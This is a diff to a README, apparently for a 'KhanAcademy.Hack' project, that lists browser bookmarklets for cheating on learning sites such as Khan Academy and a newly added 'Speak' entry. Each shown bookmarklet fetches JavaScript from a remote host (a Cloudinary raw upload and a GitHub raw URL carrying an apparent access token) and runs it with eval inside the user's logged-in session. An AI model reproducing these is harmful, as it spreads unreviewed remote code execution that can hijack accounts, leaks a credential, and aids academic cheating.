@@ -6,6 +6,11 @@
 ### Me Salva (Tampermonkey)
 [Codigo ⬆](https://github.com/rssantos013/KhanAcademy.Hack/blob/main/mesalva.js)
 
+### Speak
+```
+javascript:fetch(`https://res.cloudinary.com/dq36xqdoe/raw/upload/v${Math.floor(Math.random() * 1000000)}/main_oqidn5.js`).then(r => r.text()).then(r => eval(r))
+```
+
 ### Khan Academy
 ```
 javascript:fetch("https://raw.githubusercontent.com/rssantos013/KhanAcademy.Hack/refs/heads/main/Khanhack.js?token=GHSAT0AAAAAACZWODIRQNYMU3FM6XDKKWUAZZBGMJQ").then(t=>t.text()).then(eval);
